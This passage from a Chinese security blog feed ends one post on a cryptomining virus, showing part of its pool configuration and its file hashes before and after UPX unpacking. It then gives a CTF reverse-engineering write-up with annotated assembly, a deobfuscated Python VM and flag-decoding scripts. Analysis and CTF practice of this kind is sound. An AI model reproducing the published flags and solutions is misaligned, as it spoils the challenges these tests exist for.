class="line">            <span class="attr">&quot;nicehash&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;keepalive&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;tls&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;tls-fingerprint&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;daemon&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;self-select&quot;</span>: <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><p>记录一下病毒的Hash值</p><p>脱壳前：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5: cccc1b451fd5949d0e643418727ca562</span><br><span class="line">sha1sum: a895b622c75f83ab6e52cf7439be4d110ecc5528</span><br><span class="line">sha256sum: 8ac57ada6a18fb361f6ece37f8e56d6e73132c763f19c2d92ac82feaeb3dc0b2</span><br></pre></td></tr></table></figure><p>脱壳后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5sum: 98b3eba3ad96c884c1540fc51360ae00</span><br><span class="line">sha1sum: a1ca4569b8a07898674addc35d419799e8fabe2a</span><br><span class="line">sha256sum: 3df2a4f8452337fd1c095159cabffec4357a1d28012388fa2ad43c06bdb38b4c</span><br></pre></td></tr></table></figure><p>脱壳后放到VT看了一眼</p><p><img data-src="VT2.png" alt=""></p><p>本来能查挖矿病毒的就没有几家，加个UPX还能干掉一半，太离谱了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;朋友遇到个病毒，简单记录一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="Real" scheme="https://s0uthwood.github.io/tags/Real/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ部分RE（一）</title>
    <link href="https://s0uthwood.github.io/2021/05/26/BUUOJ%E9%83%A8%E5%88%86RE%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://s0uthwood.github.io/2021/05/26/BUUOJ%E9%83%A8%E5%88%86RE%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-05-26T15:54:09.000Z</published>
    <updated>2021-05-27T19:36:08.234Z</updated>
    
    <content type="html"><![CDATA[<p>看前一天200分就第三了，正好好久没刷BUU，打算冲一下分，随便选几道题</p><ul><li>[NPUCTF2020]BasicASM —— 简单汇编</li><li>[watevrCTF 2019]Repyc —— python语言vm</li><li>[FlareOn1]Javascrap —— php语言病毒</li><li>[watevrCTF 2019]esreveR —— 简单动调</li></ul><a id="more"></a><h1 id="NPUCTF2020-BasicASM"><a href="#NPUCTF2020-BasicASM" class="headerlink" title="[NPUCTF2020]BasicASM"></a>[NPUCTF2020]BasicASM</h1><p>纯考察汇编的题目，有考虑想办法改成正确的汇编形式然后编译用ida看，但感觉就失去意义了，于是硬啃汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">00007FF7A8AC5A50  push        rbp  </span><br><span class="line">00007FF7A8AC5A52  push        rdi  </span><br><span class="line">00007FF7A8AC5A53  sub         rsp,238h  </span><br><span class="line">00007FF7A8AC5A5A  lea         rbp,[rsp+20h]  </span><br><span class="line">00007FF7A8AC5A5F  mov         rdi,rsp  </span><br><span class="line">00007FF7A8AC5A62  mov         ecx,8Eh  </span><br><span class="line">00007FF7A8AC5A67  mov         eax,0CCCCCCCCh  </span><br><span class="line">00007FF7A8AC5A6C  rep stos    dword ptr [rdi]  </span><br><span class="line">00007FF7A8AC5A6E  mov         rax,qword ptr [__security_cookie (07FF7A8AD3018h)]  </span><br><span class="line">00007FF7A8AC5A75  xor         rax,rbp  </span><br><span class="line">00007FF7A8AC5A78  mov         qword ptr [rbp+208h],rax  </span><br><span class="line">00007FF7A8AC5A7F  lea         rcx,[__06A15900_ConsoleApplication@cpp (07FF7A8AD902Ah)]  </span><br><span class="line">00007FF7A8AC5A86  call        __CheckForDebuggerJustMyCode (07FF7A8AC1122h)  </span><br><span class="line">00007FF7A8AC5A8B  lea         rdx,[string &quot;flag&#123;this_is_a_fake_flag&#125;&quot; (07FF7A8ACF450h)]  </span><br><span class="line">00007FF7A8AC5A92  lea         rcx,[flag]  </span><br><span class="line">00007FF7A8AC5A96  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; (07FF7A8AC15E1h)  </span><br><span class="line">00007FF7A8AC5A9B  nop  </span><br><span class="line">00007FF7A8AC5A9C  mov         dword ptr [p],0  </span><br><span class="line">00007FF7A8AC5AA3  mov         i,0  </span><br><span class="line">00007FF7A8AC5AAA  jmp         main+64h (07FF7A8AC5AB4h)  </span><br><span class="line">00007FF7A8AC5AAC  mov         eax,i  </span><br><span class="line">00007FF7A8AC5AAF  inc         eax  </span><br><span class="line">00007FF7A8AC5AB1  mov         i,eax  </span><br><span class="line">00007FF7A8AC5AB4  movsxd      rax,i  </span><br><span class="line">00007FF7A8AC5AB8  mov         qword ptr [rbp+1F8h],rax  </span><br><span class="line">00007FF7A8AC5ABF  lea         rcx,[flag]  </span><br><span class="line">00007FF7A8AC5AC3  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::length (07FF7A8AC122Bh)  </span><br><span class="line">00007FF7A8AC5AC8  mov         rcx,qword ptr [rbp+1F8h]  </span><br><span class="line">00007FF7A8AC5ACF  cmp         rcx,rax  </span><br><span class="line">00007FF7A8AC5AD2  jae         main+1B2h (07FF7A8AC5C02h)  ; 无符号数比较，大于或等于时跳转</span><br><span class="line">00007FF7A8AC5AD8  mov         eax,i  </span><br><span class="line">00007FF7A8AC5ADB  and         eax,1  ; 取最后1位</span><br><span class="line">00007FF7A8AC5ADE  cmp         eax,1  ; 判断奇偶</span><br><span class="line">00007FF7A8AC5AE1  jne         main+126h (07FF7A8AC5B76h)  ; 偶数跳转（不相等跳转）</span><br><span class="line">00007FF7A8AC5AE7  movsxd      rax,i  </span><br><span class="line">00007FF7A8AC5AEB  mov         rdx,rax  </span><br><span class="line">00007FF7A8AC5AEE  lea         rcx,[flag]  </span><br><span class="line">00007FF7A8AC5AF2  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::operator[] (07FF7A8AC1442h)  </span><br><span class="line">00007FF7A8AC5AF7  movsx       eax,byte ptr [rax]  ; 取flag第i位</span><br><span class="line">00007FF7A8AC5AFA  xor         eax,42h  ; 与0x42异或</span><br><span class="line">00007FF7A8AC5AFD  mov         dword ptr [p],eax  ; 异或结果移到内存中</span><br><span class="line">00007FF7A8AC5B00  mov         dl,30h  </span><br><span class="line">00007FF7A8AC5B02  lea         rcx,[rbp+144h]  </span><br><span class="line">00007FF7A8AC5B09  call        std::setfill&lt;char&gt; (07FF7A8AC1046h)  ; 用字符&#39;0&#39;进行填充</span><br><span class="line">00007FF7A8AC5B0E  mov         qword ptr [rbp+1F8h],rax  </span><br><span class="line">00007FF7A8AC5B15  mov         edx,2  </span><br><span class="line">00007FF7A8AC5B1A  lea         rcx,[rbp+168h]  </span><br><span class="line">00007FF7A8AC5B21  call        std::setw (07FF7A8AC10D2h)  ; 填充至2位</span><br><span class="line">00007FF7A8AC5B26  mov         qword ptr [rbp+200h],rax  </span><br><span class="line">00007FF7A8AC5B2D  lea         rdx,[std::hex (07FF7A8AC1488h)]  ; 以十六进制形式输出</span><br><span class="line">00007FF7A8AC5B34  mov         rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)]  </span><br><span class="line">00007FF7A8AC5B3B  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7160h)]  </span><br><span class="line">00007FF7A8AC5B41  mov         rcx,qword ptr [rbp+200h]  </span><br><span class="line">00007FF7A8AC5B48  mov         rdx,rcx  </span><br><span class="line">00007FF7A8AC5B4B  mov         rcx,rax  </span><br><span class="line">00007FF7A8AC5B4E  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,__int64&gt; (07FF7A8AC12F8h)  </span><br><span class="line">00007FF7A8AC5B53  mov         rcx,qword ptr [rbp+1F8h]  </span><br><span class="line">00007FF7A8AC5B5A  mov         rdx,rcx  </span><br><span class="line">00007FF7A8AC5B5D  mov         rcx,rax  </span><br><span class="line">00007FF7A8AC5B60  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,char&gt; (07FF7A8AC11A4h)  </span><br><span class="line">00007FF7A8AC5B65  mov         edx,dword ptr [p]  </span><br><span class="line">00007FF7A8AC5B68  mov         rcx,rax  </span><br><span class="line">00007FF7A8AC5B6B  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7158h)]  </span><br><span class="line">00007FF7A8AC5B71  jmp         main+1ADh (07FF7A8AC5BFDh)  </span><br><span class="line">00007FF7A8AC5B76  movsxd      rax,i  ; 偶数时跳转到这里，与奇数唯一的区别为没有异或运算</span><br><span class="line">00007FF7A8AC5B7A  mov         rdx,rax  </span><br><span class="line">00007FF7A8AC5B7D  lea         rcx,[flag]  </span><br><span class="line">00007FF7A8AC5B81  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::operator[] (07FF7A8AC1442h)  </span><br><span class="line">00007FF7A8AC5B86  movsx       eax,byte ptr [rax]  </span><br><span class="line">00007FF7A8AC5B89  mov         dword ptr [p],eax  </span><br><span class="line">00007FF7A8AC5B8C  mov         dl,30h  </span><br><span class="line">00007FF7A8AC5B8E  lea         rcx,[rbp+194h]  </span><br><span class="line">00007FF7A8AC5B95  call        std::setfill&lt;char&gt; (07FF7A8AC1046h)  </span><br><span class="line">00007FF7A8AC5B9A  mov         qword ptr [rbp+1F8h],rax  </span><br><span class="line">00007FF7A8AC5BA1  mov         edx,2  </span><br><span class="line">00007FF7A8AC5BA6  lea         rcx,[rbp+1B8h]  </span><br><span class="line">00007FF7A8AC5BAD  call        std::setw (07FF7A8AC10D2h)  </span><br><span class="line">00007FF7A8AC5BB2  mov         qword ptr [rbp+200h],rax  </span><br><span class="line">00007FF7A8AC5BB9  lea         rdx,[std::hex (07FF7A8AC1488h)]  </span><br><span class="line">00007FF7A8AC5BC0  mov         rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)]  </span><br><span class="line">00007FF7A8AC5BC7  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7160h)]  </span><br><span class="line">00007FF7A8AC5BCD  mov         rcx,qword ptr [rbp+200h]  </span><br><span class="line">00007FF7A8AC5BD4  mov         rdx,rcx  </span><br><span class="line">00007FF7A8AC5BD7  mov         rcx,rax  </span><br><span class="line">00007FF7A8AC5BDA  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,__int64&gt; (07FF7A8AC12F8h)  </span><br><span class="line">00007FF7A8AC5BDF  mov         rcx,qword ptr [rbp+1F8h]  </span><br><span class="line">00007FF7A8AC5BE6  mov         rdx,rcx  </span><br><span class="line">00007FF7A8AC5BE9  mov         rcx,rax  </span><br><span class="line">00007FF7A8AC5BEC  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,char&gt; (07FF7A8AC11A4h)  </span><br><span class="line">00007FF7A8AC5BF1  mov         edx,dword ptr [p]  </span><br><span class="line">00007FF7A8AC5BF4  mov         rcx,rax  </span><br><span class="line">00007FF7A8AC5BF7  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7158h)]  </span><br><span class="line">00007FF7A8AC5BFD  jmp         main+5Ch (07FF7A8AC5AACh)  </span><br><span class="line">00007FF7A8AC5C02  mov         dword ptr [rbp+1E4h],0  </span><br><span class="line">00007FF7A8AC5C0C  lea         rcx,[flag]  </span><br><span class="line">00007FF7A8AC5C10  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::~basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; (07FF7A8AC1302h)  </span><br><span class="line">00007FF7A8AC5C15  mov         eax,dword ptr [rbp+1E4h]  </span><br><span class="line">00007FF7A8AC5C1B  mov         edi,eax  </span><br><span class="line">00007FF7A8AC5C1D  lea         rcx,[rbp-20h]  </span><br><span class="line">00007FF7A8AC5C21  lea         rdx,[__xt_z+540h (07FF7A8ACEFE0h)]  </span><br><span class="line">00007FF7A8AC5C28  call        _RTC_CheckStackVars (07FF7A8AC1596h)  </span><br><span class="line">00007FF7A8AC5C2D  mov         eax,edi  </span><br><span class="line">00007FF7A8AC5C2F  mov         rcx,qword ptr [rbp+208h]  </span><br><span class="line">00007FF7A8AC5C36  xor         rcx,rbp  </span><br><span class="line">00007FF7A8AC5C39  call        __security_check_cookie (07FF7A8AC1190h)  </span><br><span class="line">00007FF7A8AC5C3E  lea         rsp,[rbp+218h]  </span><br><span class="line">00007FF7A8AC5C45  pop         rdi  </span><br><span class="line">00007FF7A8AC5C46  pop         rbp  </span><br><span class="line">00007FF7A8AC5C47  ret  </span><br></pre></td></tr></table></figure><p>简单的说，过程就是一个循环，根据 <code>i</code> 的奇偶进行判断，是否与 <code>0x42</code> 进行异或，然后将结果以 2 位十六进制输出，所以只需要进行反向求解即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line">cipher = n2s(<span class="number">0x662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(cipher[i] ^ <span class="number">0x42</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(cipher[i]), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;d0_y0u_know_x86-64_a5m?&#125;</span></span><br></pre></td></tr></table></figure><h1 id="watevrCTF-2019-Repyc"><a href="#watevrCTF-2019-Repyc" class="headerlink" title="[watevrCTF 2019]Repyc"></a>[watevrCTF 2019]Repyc</h1><p>010看一眼，发现文件头好像没什么问题，直接用 <code>uncompyle6</code> 转成python文件</p><p>和VN的题一样，变量都成了乱码，阅读一下然后改一改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">zero = <span class="number">0</span></span><br><span class="line">one = <span class="number">1</span></span><br><span class="line">two = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">op</span>):</span></span><br><span class="line">    i = zero</span><br><span class="line">    list_a = [zero] * two ** (two * two) <span class="comment"># [0] * 16</span></span><br><span class="line">    list_b = [zero] * <span class="number">100</span></span><br><span class="line">    list_c = []</span><br><span class="line">    <span class="keyword">while</span> op[i][zero] != <span class="string">&#x27;nop&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> (i, op[i])</span><br><span class="line">        cur = op[i][zero].lower()</span><br><span class="line">        args = op[i][one:]</span><br><span class="line">        <span class="keyword">if</span> cur == <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[one]] + list_a[args[two]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;xor&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[one]] ^ list_a[args[two]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;sub&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[one]] - list_a[args[two]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;mul&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[one]] * list_a[args[two]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;div&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[one]] / list_a[args[two]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;and&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[one]] &amp; list_a[args[two]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;or&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[one]] | list_a[args[two]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;nothing&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_a[args[zero]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;mov&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = args[one]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;set_a&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = list_b[args[one]]</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line">            list_a[args[zero]] = zero</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;input_b&#x27;</span>:</span><br><span class="line">            list_b[args[zero]] = <span class="built_in">input</span>(list_a[args[one]])</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;print_a&#x27;</span>:</span><br><span class="line">            print(list_a[args[zero]])</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;c_pop&#x27;</span>:</span><br><span class="line">            i = list_c.pop()</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;append_c&#x27;</span>:</span><br><span class="line">            list_a[<span class="number">7</span>] = zero</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_a[args[zero]])):</span><br><span class="line">                <span class="keyword">if</span> list_a[args[zero]] != list_a[args[one]]:</span><br><span class="line">                    list_a[<span class="number">7</span>] = one</span><br><span class="line">                    i = list_a[args[two]]</span><br><span class="line">                    list_c.append(i)</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;xor_a&#x27;</span>:</span><br><span class="line">            str_next = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_a[args[zero]])):</span><br><span class="line">                str_next += <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_a[args[zero]][j]) ^ list_a[args[one]])</span><br><span class="line">            list_a[args[zero]] = str_next</span><br><span class="line">        <span class="keyword">elif</span> cur == <span class="string">&#x27;sub_a&#x27;</span>:</span><br><span class="line">            str_next = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_a[args[zero]])):</span><br><span class="line">                str_next += <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_a[args[zero]][j]) - list_a[args[one]])</span><br><span class="line">            list_a[args[zero]] = str_next</span><br><span class="line">        <span class="built_in">print</span> (list_a)</span><br><span class="line">        <span class="built_in">print</span> (list_b)</span><br><span class="line">        <span class="built_in">print</span> (list_c)</span><br><span class="line">        <span class="built_in">print</span> ()</span><br><span class="line">        i += one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function(</span><br><span class="line">    [</span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, zero, <span class="string">&#x27;Authentication token: &#x27;</span>],</span><br><span class="line">        <span class="comment"># 将这个字符串放到list a的0号位置</span></span><br><span class="line">        [ <span class="string">&#x27;input_b&#x27;</span>, zero, zero],</span><br><span class="line">        <span class="comment"># 将输入放到list b的0号位置</span></span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, <span class="number">6</span>, <span class="string">&#x27;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ\x97ÉïÙãäãÖÓ\x9aÕÙÛ\x99á×äÕà©â«³£ï²ÕÔÈ·±â¨ë&#x27;</span>],</span><br><span class="line">        <span class="comment"># 将这个字符串放到list a的6号位置</span></span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, two, two ** (<span class="number">3</span> * two + one) - two ** (two + one)],</span><br><span class="line">        <span class="comment"># 将120放到list a的2号位置</span></span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">        <span class="comment"># 将15放到list a的4号位置</span></span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, <span class="number">3</span>, one],</span><br><span class="line">        <span class="comment"># 将1放到list a的3号位置</span></span><br><span class="line">        [ <span class="string">&#x27;mul&#x27;</span>, two, two, <span class="number">3</span>],</span><br><span class="line">        <span class="comment"># list a的2号位置等于2号位置*3号位置，即不变</span></span><br><span class="line">        [ <span class="string">&#x27;add&#x27;</span>, two, two, <span class="number">4</span>],</span><br><span class="line">        <span class="comment"># list a的2号位置等于2号位置+4号位置，即120变为135</span></span><br><span class="line">        [ <span class="string">&#x27;nothing&#x27;</span>, zero, two],</span><br><span class="line">        [ <span class="string">&#x27;clear&#x27;</span>, <span class="number">3</span>],</span><br><span class="line">        <span class="comment"># list a的3号位置清零</span></span><br><span class="line">        [ <span class="string">&#x27;xor_a&#x27;</span>, <span class="number">6</span>, <span class="number">3</span>],</span><br><span class="line">        <span class="comment"># 6号位置中每一个字符与3异或</span></span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, zero, <span class="string">&#x27;Thanks.&#x27;</span>],</span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, one, <span class="string">&#x27;Authorizing access...&#x27;</span>],</span><br><span class="line">        [ <span class="string">&#x27;print_a&#x27;</span>, zero],</span><br><span class="line">        [ <span class="string">&#x27;set_a&#x27;</span>, zero, zero],</span><br><span class="line">        [ <span class="string">&#x27;xor_a&#x27;</span>, zero, two], <span class="comment"># 输入异或135</span></span><br><span class="line">        [ <span class="string">&#x27;sub_a&#x27;</span>, zero, <span class="number">4</span>], <span class="comment"># 输入减15</span></span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, <span class="number">5</span>, <span class="number">19</span>],</span><br><span class="line">        [ <span class="string">&#x27;append_c&#x27;</span>, zero, <span class="number">6</span>, <span class="number">5</span>],</span><br><span class="line">        [ <span class="string">&#x27;print_a&#x27;</span>, one],</span><br><span class="line">        [ <span class="string">&#x27;nop&#x27;</span>],</span><br><span class="line">        [ <span class="string">&#x27;mov&#x27;</span>, one, <span class="string">&#x27;Access denied!&#x27;</span>],</span><br><span class="line">        [ <span class="string">&#x27;print_a&#x27;</span>, one],</span><br><span class="line">        [ <span class="string">&#x27;nop&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>将过程变量输出当作动调，就比较容易看懂每条指令在干什么了</p><p>最后发现有用的就是异或135和减15，猜flag头是 <code>watevr</code>，果然和密文前6个字符对上了</p><p>所以直接一个解密就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span 